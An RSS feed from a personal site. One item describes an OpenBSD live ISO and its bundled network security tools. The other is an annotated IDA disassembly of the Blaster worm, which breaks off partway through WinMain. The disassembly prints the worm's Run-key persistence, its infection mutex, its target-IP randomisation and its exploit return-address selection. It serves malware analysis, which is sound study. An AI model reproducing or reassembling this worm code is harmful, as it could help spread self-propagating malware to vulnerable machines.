<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<atom:link href="" rel="self" type="application/rss+xml" />
<title>Nechtan</title>
<description></description>
<link>/</link>
<lastBuildDate>Fri, 21 Oct 2022 00:00:00 +0100</lastBuildDate>

<item>
<guid>/projects/cgxlive.html</guid>
<link>/projects/cgxlive.html</link>
<pubDate>Wed, 05 Aug 2009 00:00:00 +0100</pubDate>
<title>CGXLive - OpenBSD Live ISO</title>
<description><![CDATA[

<h1 id="cgxlive---openbsd-live-iso">CGXLive - OpenBSD Live ISO</h1>

<h2 id="about">About</h2>

<p>CGXLive was a live CD&#47;DVD ISO distribution based on OpenBSD. Tor and Privoxy
are started at boot-time to enable instant secure-ish internet browsing
and communication. Remember! Tor isn&#8217;t perfect, we recommend you still
use additional security layers such as SSL&#47;TLS on top of the Tor
Network. OpenVPN is also available should you wish to join a network.</p>

<h2 id="featured-software-0.43a">Featured Software (0.43a)</h2>

<ul>
<li><p><strong>OpenBSD 4.3; OpenSSL 0.9.7j; OpenSSH 4.8; Xorg 7.3</strong></p></li>
<li><p><strong>fluxbox-0.9.15.1p1</strong> - A nice, light-weight WM</p></li>
<li><p><strong>BitchX-1.0c18p3</strong> - ircII on LSD</p></li>
<li><p><strong>cryptcat-1.2.1p0</strong> - Netcat-&#62;encrypted()</p></li>
<li><p><strong>dsocks-1.6</strong> - *BSD SOCKS Wrapper</p></li>
<li><p><strong>enigmail-0.95.5p0</strong> - GnuPG for Thunderbird</p></li>
<li><p><strong>ettercap-0.6.bp5</strong> - multipurpose LAN sniffer&#47;interceptor&#47;logger</p></li>
<li><p><strong>irssi-0.8.12p1</strong> - Modern IRC Client</p></li>
<li><p><strong>irssi-silc-1.1.3p0</strong> - SILC Plugin for irssi</p></li>
<li><p><strong>irssi-icb-0.14p1</strong> - ICB support for irssi</p></li>
<li><p><strong>john-1.7.0.2p1</strong> - He&#8217;s a famous cracker.</p></li>
<li><p><strong>kismet-200710R1</strong> - 802.11x Sniffer</p></li>
<li><p><strong>links-1.00pre20</strong> - Text browser</p></li>
<li><p><strong>minicom-2.2</strong> - Serial Console</p></li>
<li><p><strong>mozilla-firefox-2.0.0.12</strong> - A Modern Browser</p></li>
<li><p><strong>mozilla-thunderbird-2.0.0.12</strong> - Graphical E-Mail&#47;RSS Client</p></li>
<li><p><strong>mutt-1.4.2.3</strong> - E-mail Client</p></li>
<li><p><strong>nano-2.0.7</strong> - Pico-clone, for those who can&#8217;t Vi</p></li>
<li><p><strong>nasm-0.98.38p0</strong> - The Netwide x86 Assembler</p></li>
<li><p><strong>ncftp-3.2.1</strong> - A nice FTP client</p></li>
<li><p><strong>netcat</strong> - Telnet on Coke (OpenBSD version)</p></li>
<li><p><strong>nikto-2.02</strong> - Web&#47;CGI Vuln Scanner</p></li>
<li><p><strong>nmap-4.53</strong> - Port Scanner &#47; Host Fingerprinter</p></li>
<li><p><strong>nmap-zenmap-4.53</strong> - GUI Frontend for nmap</p></li>
<li><p><strong>openvpn-2.0.9p1</strong> - Flexible VPN System</p></li>
<li><p><strong>p0f-2.0.8p0</strong> - Passive OS Fingerprinting</p></li>
<li><p><strong>pidgin-2.3.1p0</strong> - Multi-protocol IM client</p></li>
<li><p><strong>pidgin-otr-3.1.0p0</strong> - Off-the-Record Messaging Plugin</p></li>
<li><p><strong>privoxy-3.0.3p0</strong> - Flexible Web Proxy</p></li>
<li><p><strong>python-2.4.4p6</strong> - For those who can&#8217;t Pr3l.</p></li>
<li><p><strong>python-2.5.2</strong> - As above.</p></li>
<li><p><strong>radiusniff-0.2</strong> - RADIUS Sniffer</p></li>
<li><p><strong>radiusreport-0.3b6</strong> - RADIUS log file analysis tool</p></li>
<li><p><strong>rdesktop-1.5.0p1</strong> - TermServ Client</p></li>
<li><p><strong>rsync-2.6.9</strong> - Remote Sync</p></li>
<li><p><strong>samba-3.0.28-cups</strong> - SMB&#47;CIFS Client&#47;Server</p></li>
<li><p><strong>silc-client-1.1.3</strong> - SILC Client (&#62; IRC)</p></li>
<li><p><strong>silc-toolkit-1.1.5</strong> - SILC Toolkit</p></li>
<li><p><strong>sleuthkit-2.51</strong> - Forensic Toolkit</p></li>
<li><p><strong>smbsniff-0.0.1bp0</strong> - SMB&#47;Lanman Sniffer</p></li>
<li><p><strong>smtpscan-0.5p0</strong> - Detect remote SMTPd version</p></li>
<li><p><strong>sniffit-0.3.7b</strong> - Packet sniffer</p></li>
<li><p><strong>snort-2.8.0.1</strong> - Sniffer&#47;IDS</p></li>
<li><p><strong>snownews-1.5.9</strong> - Text-mode RSS Reader</p></li>
<li><p><strong>socat-1.6.0.0p0</strong> - netcat++ &#47; Multipurpose relay</p></li>
<li><p><strong>ssldump-0.9b3p0</strong> - SSLv3&#47;TLS Analyzer</p></li>
<li><p><strong>sslsniffer-1.21</strong> - SSL&#47;TLS Sniffer</p></li>
<li><p><strong>strobe-1.06</strong> - Very fast port scanner</p></li>
<li><p><strong>stunnel-4.20</strong> - SSL Wrapper</p></li>
<li><p><strong>terminal-0.2.8</strong> - vte-based terminal</p></li>
<li><p><strong>tightvnc-1.2.9p1</strong> - VNC</p></li>
<li><p><strong>tightvnc-viewer-1.2.9p0</strong> - VNC Client</p></li>
<li><p><strong>tin-1.8.3</strong> - Text-mode NNTP&#47;UseNet Reader</p></li>
<li><p><strong>tor-0.1.2.19</strong> - Onion Routing daemon</p></li>
<li><p><strong>vlc-0.8.6e</strong> - VideLan Client</p></li>
<li><p><strong>x3270-3.3.6p1</strong> - 3270 console</p></li>
<li><p><strong>xpdf-3.02pl2p2</strong> - A motif PDF reader</p></li>
</ul>

]]></description>
</item>

<item>
<guid>/code/blaster_analysis.html</guid>
<link>/code/blaster_analysis.html</link>
<pubDate>Sat, 10 Apr 2004 00:00:00 +0100</pubDate>
<title></title>
<description><![CDATA[

<pre><code>.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |     This file is generated by The Interactive Disassembler (IDA)        |
.text:00401000 ; |     Copyright (c) 2003 by DataRescue sa&#47;nv, &#60;ida@datarescue.com&#62;        |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Go to function WinMain() at 00401250 for the beginning of the worm code
.text:00401000 ; itself.  Code before 00401250 and after 00402157 is standard CRT stuff and
.text:00401000 ; is therefore not commented.
.text:00401000 ;
.text:00401000 ; ---------------------------------------------------------------------------
.text:00401000 ; File Name   : msblast.exe.unpacked
.text:00401000 ; Format      : Portable executable for IBM PC (PE)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00001458 (   5208.)
.text:00401000 ; Section size in file          : 00001458 (   5208.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : 16 bytes ?
.text:00401000 
.text:00401000 
.text:00401000 unicode         macro page,string,zero
.text:00401000                 irpc c,&#60;string&#62;
.text:00401000                 db &#39;&#38;c&#39;, page
.text:00401000                 endm
.text:00401000                 ifnb &#60;zero&#62;
.text:00401000                 dw zero
.text:00401000                 endif
.text:00401000 endm
.text:00401000 
.text:00401000                 model flat
.text:00401000 
.text:00401000 ; ---------------------------------------------------------------------------
.text:00401000 
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read&#47;Execute
.text:00401000 _text           segment para public &#39;CODE&#39; use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000 
.text:00401000 loc_401000:                             ; DATA XREF: sub_401020+Avo
.text:00401000                 xor     eax, eax
.text:00401002                 inc     eax
.text:00401003                 mov     ecx, [esp+4]
.text:00401007                 test    dword ptr [ecx+4], 6
.text:0040100E                 jz      short locret_40101F
.text:00401010                 mov     eax, [esp+8]
.text:00401014                 mov     edx, [esp+10h]
.text:00401018                 mov     [edx], eax
.text:0040101A                 mov     eax, 3
.text:0040101F 
.text:0040101F locret_40101F:                          ; CODE XREF: .text:0040100E^j
.text:0040101F                 retn
.text:00401020 
.text:00401020 ; =============== S U B R O U T I N E =======================================
.text:00401020 
.text:00401020 
.text:00401020 sub_401020      proc near               ; CODE XREF: .text:0040110Dvp
.text:00401020                                         ; .text:00401138vp
.text:00401020 
.text:00401020 var_8           = dword ptr -8
.text:00401020 arg_0           = dword ptr  10h
.text:00401020 arg_4           = dword ptr  14h
.text:00401020 
.text:00401020                 push    ebx
.text:00401021                 push    esi
.text:00401022                 push    edi
.text:00401023                 mov     eax, [esp+arg_0]
.text:00401027                 push    eax
.text:00401028                 push    0FFFFFFFEh
.text:0040102A                 push    offset loc_401000
.text:0040102F                 push    large dword ptr fs:0
.text:00401036                 mov     large fs:0, esp
.text:0040103D 
.text:0040103D loc_40103D:                             ; CODE XREF: sub_401020+44vj
.text:0040103D                                         ; sub_401020+4Avj
.text:0040103D                 mov     eax, [esp+10h+arg_0]
.text:00401041                 mov     ebx, [eax+8]
.text:00401044                 mov     esi, [eax+0Ch]
.text:00401047                 cmp     esi, 0FFFFFFFFh
.text:0040104A                 jz      short loc_40106C
.text:0040104C                 cmp     esi, [esp+10h+arg_4]
.text:00401050                 jz      short loc_40106C
.text:00401052                 lea     esi, [esi+esi*2]
.text:00401055                 mov     ecx, [ebx+esi*4]
.text:00401058                 mov     ecx, [esp+10h+var_8]
.text:0040105C                 mov     ecx, [eax+0Ch]
.text:0040105F                 cmp     dword ptr [ebx+esi*4+4], 0
.text:00401064                 jnz     short loc_40103D
.text:00401066                 call    dword ptr [ebx+esi*4+8]
.text:0040106A                 jmp     short loc_40103D
.text:0040106C ; ---------------------------------------------------------------------------
.text:0040106C 
.text:0040106C loc_40106C:                             ; CODE XREF: sub_401020+2A^j
.text:0040106C                                         ; sub_401020+30^j
.text:0040106C                 pop     large dword ptr fs:0
.text:00401073                 add     esp, 0Ch
.text:00401076                 pop     edi
.text:00401077                 pop     esi
.text:00401078                 pop     ebx
.text:00401079                 retn
.text:00401079 sub_401020      endp
.text:00401079 
.text:0040107A 
.text:0040107A ; =============== S U B R O U T I N E =======================================
.text:0040107A 
.text:0040107A ; Attributes: bp-based frame
.text:0040107A 
.text:0040107A sub_40107A      proc near               ; CODE XREF: .text:00401100vp
.text:0040107A 
.text:0040107A arg_0           = dword ptr  8
.text:0040107A 
.text:0040107A                 push    ebp
.text:0040107B                 mov     ebp, esp
.text:0040107D                 push    ebx
.text:0040107E                 push    esi
.text:0040107F                 push    edi
.text:00401080                 push    ebp
.text:00401081                 push    0
.text:00401083                 push    0
.text:00401085                 push    offset loc_401092
.text:0040108A                 push    [ebp+arg_0]
.text:0040108D                 call    RtlUnwind
.text:00401092 
.text:00401092 loc_401092:                             ; DATA XREF: sub_40107A+B^o
.text:00401092                 pop     ebp
.text:00401093                 pop     edi
.text:00401094                 pop     esi
.text:00401095                 pop     ebx
.text:00401096                 mov     esp, ebp
.text:00401098                 pop     ebp
.text:00401099                 retn
.text:00401099 sub_40107A      endp
.text:00401099 
.text:0040109A ; ---------------------------------------------------------------------------
.text:0040109A 
.text:0040109A loc_40109A:                             ; DATA XREF: start+10vo
.text:0040109A                 cld
.text:0040109B                 push    ebp
.text:0040109C                 mov     ebp, esp
.text:0040109E                 sub     esp, 8
.text:004010A1                 push    ebx
.text:004010A2                 push    esi
.text:004010A3                 push    edi
.text:004010A4                 push    ebp
.text:004010A5                 mov     ebx, [ebp+0Ch]
.text:004010A8                 mov     eax, [ebp+8]
.text:004010AB                 mov     dword_404030, eax
.text:004010B0                 mov     dword_404034, ebx
.text:004010B6                 test    dword ptr [eax+4], 6
.text:004010BD                 jnz     short loc_401131
.text:004010BF                 mov     [ebp-8], eax
.text:004010C2                 mov     eax, [ebp+10h]
.text:004010C5                 mov     [ebp-4], eax
.text:004010C8                 mov     dword_404034, eax
.text:004010CD                 lea     eax, [ebp-8]
.text:004010D0                 mov     [ebx-4], eax
.text:004010D3                 mov     esi, [ebx+0Ch]
.text:004010D6                 mov     edi, [ebx+8]
.text:004010D9 
.text:004010D9 loc_4010D9:                             ; CODE XREF: .text:0040112Bvj
.text:004010D9                 cmp     esi, 0FFFFFFFFh
.text:004010DC                 jz      short loc_401140
.text:004010DE                 lea     ecx, [esi+esi*2]
.text:004010E1                 cmp     dword ptr [edi+ecx*4+4], 0
.text:004010E6                 jz      short loc_401122
.text:004010E8                 push    esi
.text:004010E9                 push    ebp
.text:004010EA                 lea     ebp, [ebx+10h]
.text:004010ED                 call    dword ptr [edi+ecx*4+4]
.text:004010F1                 pop     ebp
.text:004010F2                 pop     esi
.text:004010F3                 mov     ebx, [ebp+0Ch]
.text:004010F6                 or      eax, eax
.text:004010F8                 jz      short loc_401122
.text:004010FA                 js      short loc_40112D
.text:004010FC                 mov     edi, [ebx+8]
.text:004010FF                 push    ebx
.text:00401100                 call    sub_40107A
.text:00401105                 add     esp, 4
.text:00401108                 lea     ebp, [ebx+10h]
.text:0040110B                 push    esi
.text:0040110C                 push    ebx
.text:0040110D                 call    sub_401020
.text:00401112                 add     esp, 8
.text:00401115                 lea     ecx, [esi+esi*2]
.text:00401118                 mov     eax, [edi+ecx*4]
.text:0040111B                 mov     eax, [ebx+0Ch]
.text:0040111E                 call    dword ptr [edi+ecx*4+8]
.text:00401122 
.text:00401122 loc_401122:                             ; CODE XREF: .text:004010E6^j
.text:00401122                                         ; .text:004010F8^j
.text:00401122                 mov     edi, [ebx+8]
.text:00401125                 lea     ecx, [esi+esi*2]
.text:00401128                 mov     esi, [edi+ecx*4]
.text:0040112B                 jmp     short loc_4010D9
.text:0040112D ; ---------------------------------------------------------------------------
.text:0040112D 
.text:0040112D loc_40112D:                             ; CODE XREF: .text:004010FA^j
.text:0040112D                 xor     eax, eax
.text:0040112F                 jmp     short loc_4011A2
.text:00401131 ; ---------------------------------------------------------------------------
.text:00401131 
.text:00401131 loc_401131:                             ; CODE XREF: .text:004010BD^j
.text:00401131                 push    ebp
.text:00401132                 lea     ebp, [ebx+10h]
.text:00401135                 push    0FFFFFFFFh
.text:00401137                 push    ebx
.text:00401138                 call    sub_401020
.text:0040113D                 add     esp, 0Ch
.text:00401140 
.text:00401140 loc_401140:                             ; CODE XREF: .text:004010DC^j
.text:00401140                 push    0
.text:00401142                 mov     dword_404010, 0Bh
.text:0040114C                 push    0Bh
.text:0040114E                 call    signal
.text:00401153                 add     esp, 8
.text:00401156                 or      eax, eax
.text:00401158                 jnz     short loc_40117B
.text:0040115A                 push    0
.text:0040115C                 mov     dword_404010, 8
.text:00401166                 push    8
.text:00401168                 call    signal
.text:0040116D                 add     esp, 8
.text:00401170                 or      eax, eax
.text:00401172                 jnz     short loc_40117B
.text:00401174                 mov     eax, 1
.text:00401179                 jmp     short loc_4011A2
.text:0040117B ; ---------------------------------------------------------------------------
.text:0040117B 
.text:0040117B loc_40117B:                             ; CODE XREF: .text:00401158^j
.text:0040117B                                         ; .text:00401172^j
.text:0040117B                 cmp     eax, 0FFFFFFFFh
.text:0040117E                 jz      short loc_4011AA
.text:00401180                 push    eax
.text:00401181                 push    dword_404010
.text:00401187                 call    signal
.text:0040118C                 add     esp, 8
.text:0040118F                 push    dword_404010
.text:00401195                 call    raise
.text:0040119A                 add     esp, 4
.text:0040119D                 mov     eax, 1
.text:004011A2 
.text:004011A2 loc_4011A2:                             ; CODE XREF: .text:0040112F^j
.text:004011A2                                         ; .text:00401179^j ...
.text:004011A2                 pop     ebp
.text:004011A3                 pop     edi
.text:004011A4                 pop     esi
.text:004011A5                 pop     ebx
.text:004011A6                 mov     esp, ebp
.text:004011A8                 pop     ebp
.text:004011A9                 retn
.text:004011AA ; ---------------------------------------------------------------------------
.text:004011AA 
.text:004011AA loc_4011AA:                             ; CODE XREF: .text:0040117E^j
.text:004011AA                 cmp     dword_40402C, 0
.text:004011B1                 jnz     short loc_4011BA
.text:004011B3                 mov     eax, 1
.text:004011B8                 jmp     short loc_4011A2
.text:004011BA ; ---------------------------------------------------------------------------
.text:004011BA 
.text:004011BA loc_4011BA:                             ; CODE XREF: .text:004011B1^j
.text:004011BA                 mov     eax, dword_40402C
.text:004011BF                 push    0Bh
.text:004011C1                 jmp     eax
.text:004011C3 ; ---------------------------------------------------------------------------
.text:004011C3                 pop     eax
.text:004011C4                 mov     eax, 1
.text:004011C9                 jmp     short loc_4011A2
.text:004011CB 
.text:004011CB ; =============== S U B R O U T I N E =======================================
.text:004011CB 
.text:004011CB ; Attributes: bp-based frame
.text:004011CB 
.text:004011CB                 public start
.text:004011CB start           proc near
.text:004011CB 
.text:004011CB var_30          = word ptr -30h
.text:004011CB var_18          = dword ptr -18h
.text:004011CB var_4           = dword ptr -4
.text:004011CB 
.text:004011CB                 mov     eax, large fs:0
.text:004011D1                 push    ebp
.text:004011D2                 mov     ebp, esp
.text:004011D4                 push    0FFFFFFFFh
.text:004011D6                 push    offset unk_40401C
.text:004011DB                 push    offset loc_40109A
.text:004011E0                 push    eax
.text:004011E1                 mov     large fs:0, esp
.text:004011E8                 sub     esp, 10h
.text:004011EB                 push    ebx
.text:004011EC                 push    esi
.text:004011ED                 push    edi
.text:004011EE                 mov     [ebp+var_18], esp
.text:004011F1                 push    eax
.text:004011F2                 fnstcw  [esp+30h+var_30]
.text:004011F5                 or      word ptr [esp], 300h
.text:004011FB                 fldcw   [esp+30h+var_30]
.text:004011FE                 add     esp, 4
.text:00401201                 push    0
.text:00401203                 push    0
.text:00401205                 push    offset dword_404028
.text:0040120A                 push    offset dword_404024
.text:0040120F                 push    offset dword_404020
.text:00401214                 call    __GetMainArgs
.text:00401219                 push    dword_404028
.text:0040121F                 push    dword_404024
.text:00401225                 push    dword_404020
.text:0040122B                 mov     dword_404014, esp
.text:00401231                 call    sub_402254
.text:00401236                 add     esp, 18h
.text:00401239                 xor     ecx, ecx
.text:0040123B                 mov     [ebp+var_4], ecx
.text:0040123E                 push    eax
.text:0040123F                 call    exit
.text:00401244                 leave
.text:00401245                 retn
.text:00401245 start           endp
.text:00401245 
.text:00401245 ; ---------------------------------------------------------------------------
.text:00401246                 align 4
.text:00401248                 mov     large fs:0, eax
.text:0040124E                 retn
.text:0040124E ; ---------------------------------------------------------------------------
.text:0040124F                 align 4
.text:00401250 
.text:00401250 ; =============== S U B R O U T I N E =======================================
.text:00401250 
.text:00401250 ; Attributes: bp-based frame
.text:00401250 
.text:00401250 WinMain         proc near               ; CODE XREF: sub_402254+5Cvp
.text:00401250 
.text:00401250 in              = in_addr ptr -3ACh
.text:00401250 var_3A8         = dword ptr -3A8h
.text:00401250 var_3A4         = dword ptr -3A4h
.text:00401250 name            = byte ptr -3A0h
.text:00401250 WSAData         = WSAData ptr -1A0h
.text:00401250 szMonth         = byte ptr -10h
.text:00401250 szDay           = byte ptr -0Ch
.text:00401250 hKey            = dword ptr -8
.text:00401250 ThreadId        = dword ptr -4
.text:00401250 
.text:00401250                 push    ebp
.text:00401251                 mov     ebp, esp
.text:00401253                 sub     esp, 3ACh
.text:00401259                 push    esi
.text:0040125A                 push    edi
.text:0040125B                 xor     esi, esi
.text:0040125D 
.text:0040125D Create&#47;open HKLM\Software\Microsoft\Windows\CurrentVersion\Run
.text:0040125D 
.text:0040125D                 push    0               ; lpdwDisposition
.text:0040125F                 lea     eax, [ebp+hKey]
.text:00401262                 push    eax             ; phkResult
.text:00401263                 push    0               ; lpSecurityAttributes
.text:00401265                 push    0F003Fh         ; samDesired
.text:0040126A                 push    0               ; dwOptions
.text:0040126C                 push    0               ; lpClass
.text:0040126E                 push    0               ; Reserved
.text:00401270                 push    offset aSoftwareMicros ; lpSubKey
.text:00401275                 push    80000002h       ; hKey = HKEY_LOCAL_MACHINE
.text:0040127A                 call    RegCreateKeyExA
.text:0040127F 
.text:0040127F Create "windows auto update" string value = "msblast.exe"
.text:0040127F 
.text:0040127F                 push    32h             ; cbData (some extra here after null term)
.text:00401281                 push    offset aMsblast_exe ; lpData
.text:00401286                 push    1               ; dwType = REG_SZ
.text:00401288                 push    0               ; Reserved
.text:0040128A                 push    offset aWindowsAutoUpd ; lpValueName
.text:0040128F                 push    [ebp+hKey]      ; hKey
.text:00401292                 call    RegSetValueExA
.text:00401297                 push    [ebp+hKey]      ; hKey
.text:0040129A                 call    RegCloseKey
.text:0040129F 
.text:0040129F Create "BILLY" named mutex to prevent multiple infection
.text:0040129F 
.text:0040129F                 push    offset aBilly   ; lpName
.text:004012A4                 push    1               ; bInitialOwner
.text:004012A6                 push    0               ; lpMutexAttributes
.text:004012A8                 call    CreateMutexA
.text:004012AD                 call    GetLastError
.text:004012B2                 cmp     eax, 0B7h       ; 183 (0xB7): mutex already exists
.text:004012B7                 jnz     short loc_4012C0 ; if BILLY mutex does not exist... continue here
.text:004012B9                 push    0               ; uExitCode
.text:004012BB                 call    ExitProcess
.text:004012C0 
.text:004012C0 Initialize Winsock
.text:004012C0 
.text:004012C0 loc_4012C0:                             ; CODE XREF: WinMain+67^j
.text:004012C0                 lea     eax, [ebp+WSAData] ; if BILLY mutex does not exist... continue here
.text:004012C6                 push    eax             ; lpWSAData
.text:004012C7                 push    202h            ; wVersionRequested (2.2)
.text:004012CC                 call    WSAStartup
.text:004012D1                 or      eax, eax
.text:004012D3                 jz      short loc_401304
.text:004012D5                 lea     eax, [ebp+WSAData]
.text:004012DB                 push    eax             ; lpWSAData
.text:004012DC                 push    101h            ; wVersionRequested (1.1)
.text:004012E1                 call    WSAStartup
.text:004012E6                 or      eax, eax
.text:004012E8                 jz      short loc_401304
.text:004012EA                 lea     eax, [ebp+WSAData]
.text:004012F0                 push    eax             ; lpWSAData
.text:004012F1                 push    1               ; wVersionRequested (1.0)
.text:004012F3                 call    WSAStartup
.text:004012F8                 or      eax, eax
.text:004012FA                 jz      short loc_401304
.text:004012FC                 or      eax, 0FFFFFFFFh
.text:004012FF                 jmp     loc_401570      ; return
.text:00401304 ; ---------------------------------------------------------------------------
.text:00401304 
.text:00401304 loc_401304:                             ; CODE XREF: WinMain+83^j
.text:00401304                                         ; WinMain+98^j ...
.text:00401304                 push    104h            ; nSize
.text:00401309                 push    offset Filename ; lpFilename
.text:0040130E                 push    0               ; hModule
.text:00401310                 call    GetModuleFileNameA ; get worm executable&#39;s file name (for fopen()&#39;ing later)
.text:00401315 
.text:00401315 Wait until host is connected to Internet
.text:00401315 
.text:00401315 loc_401315:                             ; CODE XREF: WinMain+DEvj
.text:00401315                 push    0               ; sleep 20 second intervals until connected to Internet
.text:00401317                 lea     eax, [ebp+ThreadId]
.text:0040131A                 push    eax
.text:0040131B                 call    InternetGetConnectedState
.text:00401320                 or      eax, eax
.text:00401322                 jnz     short loc_401330 ; start at beginning of subnet (x.x.x.0)
.text:00401324                 push    4E20h           ; dwMilliseconds = 20000 (20 seconds)
.text:00401329                 call    Sleep
.text:0040132E                 jmp     short loc_401315 ; sleep 20 second intervals until connected to Internet
.text:00401330 ; ---------------------------------------------------------------------------
.text:00401330 
.text:00401330 Get IP address and selectively apply randomization
.text:00401330 
.text:00401330 loc_401330:                             ; CODE XREF: WinMain+D2^j
.text:00401330                 and     ds:octet4, 0    ; start at beginning of subnet (x.x.x.0)
.text:00401337                 call    GetTickCount
.text:0040133C                 push    eax
.text:0040133D                 call    srand           ; seed random number generator with GetTickCount()
.text:00401342                 pop     ecx
.text:00401343                 call    rand
.text:00401348                 mov     ecx, 0FEh
.text:0040134D                 cdq
.text:0040134E                 idiv    ecx
.text:00401350                 mov     edi, edx
.text:00401352                 inc     edi
.text:00401353                 mov     ds:synspoofoctet1, edi ; rand() % 254
.text:00401353                                         ; make first and second octets of spoofed SYN
.text:00401353                                         ; source address random at first -- if we can&#39;t
.text:00401353                                         ; get our local IP, then leave these random;
.text:00401353                                         ; otherwise, replace them with our local IP&#39;s
.text:00401353                                         ; first and second octets
.text:00401359                 call    rand
.text:0040135E                 mov     ecx, 0FEh
.text:00401363                 cdq
.text:00401364                 idiv    ecx
.text:00401366                 mov     ds:synspoofoctet2, edx ; rand() % 254
.text:0040136C                 push    200h            ; namelen
.text:00401371                 lea     eax, [ebp+name]
.text:00401377                 push    eax             ; name
.text:00401378                 call    gethostname     ; get name of local machine for IP lookup
.text:0040137D                 cmp     eax, 0FFFFFFFFh
.text:00401380                 jz      loc_401476      ; did gethostname() fail?
.text:00401386                 lea     eax, [ebp+name]
.text:0040138C                 push    eax             ; name
.text:0040138D                 call    gethostbyname   ; now that we have machine name, get local IP address
.text:00401392                 mov     [ebp+var_3A4], eax
.text:00401398                 or      eax, eax
.text:0040139A                 jz      loc_401476      ; did gethostbyname() fail?
.text:004013A0                 mov     ecx, [eax+0Ch]
.text:004013A3                 cmp     dword ptr [ecx], 0
.text:004013A6                 jz      loc_401476      ; is *h_addr_list NULL? (couldn&#39;t get a local IP address)
.text:004013AC                 push    4               ; sizeof(struct in_addr) = 4
.text:004013AE                 mov     eax, [eax+0Ch]
.text:004013B1                 push    dword ptr [eax] ; use ptr to first address in h_addr_list as source
.text:004013B3                 lea     eax, [ebp+in]
.text:004013B9                 push    eax             ; dest is &#38;[EBP+in], which is struct in_addr
.text:004013BA                 call    memcpy
.text:004013BF                 push    dword ptr [ebp+in.S_un] ; in
.text:004013C5                 call    inet_ntoa
.text:004013CA                 push    eax
.text:004013CB                 push    offset aS       ; "%s"
.text:004013D0                 lea     edi, [ebp+name]
.text:004013D6                 push    edi
.text:004013D7                 call    sprintf
.text:004013DC                 push    offset a_       ; "."
.text:004013E1                 lea     eax, [ebp+name]
.text:004013E7                 push    eax
.text:004013E8                 call    strtok          ; get first octet from IP address string ("." is delimiter)
.text:004013ED                 mov     [ebp+var_3A8], eax
.text:004013F3                 push    eax
.text:004013F4                 call    atoi
.text:004013F9                 mov     ds:octet1, eax
.text:004013FE                 push    offset a_       ; "."
.text:00401403                 push    0
.text:00401405                 call    strtok          ; get second octet
.text:0040140A                 mov     [ebp+var_3A8], eax
.text:00401410                 push    eax
.text:00401411                 call    atoi
.text:00401416                 mov     ds:octet2, eax
.text:0040141B                 push    offset a_       ; "."
.text:00401420                 push    0
.text:00401422                 call    strtok          ; get third octet
.text:00401427                 mov     [ebp+var_3A8], eax
.text:0040142D                 push    eax
.text:0040142E                 call    atoi
.text:00401433                 add     esp, 3Ch
.text:00401436                 mov     ds:octet3, eax
.text:0040143B                 cmp     eax, 14h
.text:0040143E                 jle     short loc_40145F ; third octet &#60;= 20?
.text:00401440                 call    GetTickCount
.text:00401445                 push    eax
.text:00401446                 call    srand
.text:0040144B                 pop     ecx
.text:0040144C                 call    rand
.text:00401451                 mov     ecx, 14h
.text:00401456                 cdq
.text:00401457                 idiv    ecx
.text:00401459                 sub     ds:octet3, edx  ; subtract (rand() % 20) from 3rd octet (if it&#39;s &#62; 20)
.text:0040145F 
.text:0040145F loc_40145F:                             ; CODE XREF: WinMain+1EE^j
.text:0040145F                 mov     eax, ds:octet1  ; use first and second octets of local IP for
.text:0040145F                                         ; spoofed source address of SYN packets
.text:0040145F                                         ; (this code will only be reached if we were
.text:0040145F                                         ; able to get the local machine&#39;s IP address)
.text:00401464                 mov     ds:synspoofoctet1, eax
.text:00401469                 mov     eax, ds:octet2
.text:0040146E                 mov     ds:synspoofoctet2, eax
.text:00401473                 xor     esi, esi
.text:00401475                 inc     esi             ; ESI = 1
.text:00401476 
.text:00401476 loc_401476:                             ; CODE XREF: WinMain+130^j
.text:00401476                                         ; WinMain+14A^j ...
.text:00401476                 call    GetTickCount    ; jump ahead to here if unable to get local IP
.text:00401476                                         ; (note that ESI=0 if we jumped here after failing
.text:00401476                                         ; to get our local IP, meaning that, in that case,
.text:00401476                                         ; we&#39;ll always randomize the initial target IP)
.text:0040147B                 push    eax
.text:0040147C                 call    srand
.text:00401481                 pop     ecx
.text:00401482                 call    rand
.text:00401487                 mov     ecx, 14h
.text:0040148C                 cdq
.text:0040148D                 idiv    ecx
.text:0040148F                 cmp     edx, 0Ch        ; EDX = random number from 0..19
.text:00401492                 jge     short loc_401496 ; ESI=1: 8&#47;20 (40%) chance
.text:00401494                 xor     esi, esi        ; ESI=0: 12&#47;20 (60%) chance
.text:00401496 
.text:00401496 Randomly decide which return address to use in the exploit
.text:00401496   80%: dwWhichRetAddr = 1 -- Windows XP address (0100139Dh)
.text:00401496   20%: dwWhichRetAddr = 2 -- Windows 2000 address (0018759Fh)
.text:00401496 
.text:00401496 loc_401496:                             ; CODE XREF: WinMain+242^j
.text:00401496                 mov     ds:dwWhichRetAddr, 1
.text:004014A0                 call    rand
.text:004014A5                 mov     ecx, 0Ah
.text:004014AA                 cdq
.text:004014AB                 idiv    ecx
.text:004014AD                 cmp     edx, 7          ; EDX = rand() % 10
.text:004014B0                 jle     short loc_4014BC ; 8&#47;10 (80%) chance: leave dwWhichRetAddr = 1 (XP ret addr)
.text:004014B2                 mov     ds:dwWhichRetAddr, 2 ; 2&#47;10 (20%) chance: set to 2 (Windows 2000 ret addr)
.text:004014BC 
.text:004014BC 12&#47;20 (60%) chance that the 1st, 2nd, and 3rd octets will be randomized:
.text:004014BC   1st: 1..254
.text:004014BC   2nd: 0..253
.text:004014BC   3rd: 0..253
.text:004014BC 
.text:004014BC loc_4014BC:                             ; CODE XREF: WinMain+260^j
.text:004014BC                 or      esi, esi
.text:004014BE                 jnz     short loc_4014FC ; if ESI=1 (40% chance), DON&#39;T randomize first 3 octets
.text:004014C0                 call    rand
.text:004014C5                 mov     ecx, 0FEh
.text:004014CA                 cdq
.text:004014CB                 idiv    ecx
.text:004014CD                 mov     edi, edx
.text:004014CF                 inc     edi
.text:004014D0                 mov     ds:octet1, edi  ; (rand() % 254) + 1
.text:004014D6                 call    rand
